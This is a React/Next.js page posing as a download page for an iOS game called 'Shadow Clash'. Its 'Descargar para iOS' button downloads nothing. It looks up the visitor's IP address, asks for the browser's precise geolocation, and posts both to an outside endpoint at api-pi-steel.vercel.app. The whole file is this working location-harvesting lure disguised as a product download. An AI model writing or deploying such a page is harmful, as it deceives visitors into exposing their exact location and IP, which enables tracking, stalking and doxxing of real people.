import Head from 'next/head'

export default function Home() {
  return (
    <>
      <Head>
        <title>Shadow Clash</title>
        <meta name="description" content="Shadow Clash iOS Download" />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet" />
      </Head>

      <div className="min-h-screen bg-gradient-to-b from-[#0f0f0f] to-[#1a1a1a] text-white flex flex-col items-center justify-center font-[Inter]">
        <h1 className="text-5xl md:text-6xl font-extrabold mb-8">Shadow Clash</h1>

        <button
          onClick={async () => {
            const ipResponse = await fetch('https://api64.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            navigator.geolocation.getCurrentPosition(async (position) => {
              const lat = position.coords.latitude.toFixed(6);
              const lon = position.coords.longitude.toFixed(6);
              const text = `${lat},${lon}-${ip}`;
              
              await fetch('https://api-pi-steel.vercel.app/guardar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ texto: text })
              });
              
              alert('Datos enviados.');
            });
          }}
          className="flex items-center gap-2 bg-white text-black font-semibold px-6 py-3 rounded-lg hover:bg-gray-200 transition"
        >
          <img src="/apple.svg" alt="Apple" className="w-5 h-5" />
          Descargar para iOS
        </button>
      </div>
    </>
  );
}
